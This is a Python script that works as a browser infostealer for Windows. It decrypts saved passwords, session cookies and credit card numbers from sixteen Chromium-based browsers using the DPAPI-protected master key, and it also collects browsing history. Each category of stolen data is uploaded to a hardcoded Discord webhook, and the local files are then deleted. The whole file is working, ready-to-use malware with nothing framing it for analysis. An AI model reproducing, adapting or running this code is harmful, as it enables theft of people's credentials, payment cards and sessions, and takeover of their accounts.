import os
import json
import base64
import sqlite3
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import shutil
from datetime import datetime
import requests

appdata = os.getenv('LOCALAPPDATA')

browsers = {
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
}

WEBHOOK_URL = 'https://discord.com/api/webhooks/1114992674987069461/wV-1u2U4TRBlKBWVqaL5vAONNLW1zrrh87r7j479R96Az3rlqwGKB5VKRUXfNNhrL71U'  # Replace with your actual webhook URL


def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r',
                              encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_password(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass


def send_file_to_webhook(file_path: str):
    with open(file_path, 'rb') as file:
        chunk_size = 1024 * 1024  # 1 MB
        while True:
            data = file.read(chunk_size)
            if not data:
                break

            payload = {
                'file': base64.b64encode(data).decode(),
                'file_name': os.path.basename(file_path)
            }
            headers = {'Content-Type': 'application/json'}
            response = requests.post(WEBHOOK_URL,
                                     data=json.dumps(payload),
                                     headers=headers)
            print(
                f"Sent chunk of {len(data)} bytes to webhook. Response: {response.status_code}"
            )


def save_results(browser_name, data_type, content):
    if not os.path.exists(browser_name):
        os.mkdir(browser_name)
    if content is not None:
        with open(f'{browser_name}/{data_type}.txt', 'w',
                  encoding='utf-8') as file:
            file.write(content)
        print(f"\t [*] Saved in {browser_name}/{data_type}.txt")
        send_file_to_webhook(f'{browser_name}/{data_type}.txt')
        os.remove(f'{browser_name}/{data_type}.txt')
    else:
        print(f"\t [-] No Data Found!")


def get_login_data(path: str, profile: str, master_key):
    login_db = f'{path}\\{profile}\\Login Data'
    if not os.path.exists(login_db):
        return
    result = ""
    shutil.copy(login_db, 'login_db')
    conn = sqlite3.connect('login_db')
    cursor = conn.cursor()
    cursor.execute(
        'SELECT action_url, username_value, password_value FROM logins')
    for row in cursor.fetchall():
        password = decrypt_password(row[2], master_key)
        result += f"""
        URL: {row[0]}
        Email: {row[1]}
        Password: {password}
        
        """
    conn.close()
    os.remove('login_db')
    return result


def get_credit_cards(path: str, profile: str, master_key):
    cards_db = f'{path}\\{profile}\\Web Data'
    if not os.path.exists(cards_db):
        return

    result = ""
    shutil.copy(cards_db, 'cards_db')
    conn = sqlite3.connect('cards_db')
    cursor = conn.cursor()
    cursor.execute(
        'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards'
    )
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        card_number = decrypt_password(row[3], master_key)
        result += f"""
        Name On Card: {row[0]}
        Card Number: {card_number}
        Expires On:  {row[1]} / {row[2]}
        Added On: {datetime.fromtimestamp(row[4])}
        
        """

    conn.close()
    os.remove('cards_db')
    return result


def get_cookies(path: str, profile: str, master_key):
    cookie_db = f'{path}\\{profile}\\Network\\Cookies'
    if not os.path.exists(cookie_db):
        return
    result = ""
    shutil.copy(cookie_db, 'cookie_db')
    conn = sqlite3.connect('cookie_db')
    cursor = conn.cursor()
    cursor.execute(
        'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies'
    )
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        cookie = decrypt_password(row[3], master_key)

        result += f"""
        Host Key : {row[0]}
        Cookie Name : {row[1]}
        Path: {row[2]}
        Cookie: {cookie}
        Expires On: {row[4]}
        
        """

    conn.close()
    os.remove('cookie_db')
    return result


def get_web_history(path: str, profile: str):
    web_history_db = f'{path}\\{profile}\\History'
    result = ""
    if not os.path.exists(web_history_db):
        return

    shutil.copy(web_history_db, 'web_history_db')
    conn = sqlite3.connect('web_history_db')
    cursor = conn.cursor()
    cursor.execute(
        'SELECT title, url, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC'
    )
    for row in cursor.fetchall():
        result += f"""
        Title: {row[0]}
        URL: {row[1]}
        Visit Count: {row[2]}
        Last Visit Time: {datetime.fromtimestamp(row[3]/1000000)}
        
        """
    conn.close()
    os.remove('web_history_db')
    return result


def main():
    for browser_name, browser_path in browsers.items():
        print(f"[*] Extracting data from {browser_name}...")
        master_key = get_master_key(browser_path)
        if master_key:
            print(f"Master Key Found for {browser_name}!")
            save_results(browser_name, "Saved_Passwords",
                         get_login_data(browser_path, "Default", master_key))
            save_results(browser_name, "Browser_Cookies",
                         get_cookies(browser_path, "Default", master_key))
            save_results(browser_name, "Saved_Credit_Cards",
                         get_credit_cards(browser_path, "Default", master_key))
            save_results(browser_name, "Browser_History",
                         get_web_history(browser_path, "Default"))
            
            
        else:
            print(f"Master Key Not Found for {browser_name}!")

        


if __name__ == '__main__':
    main()
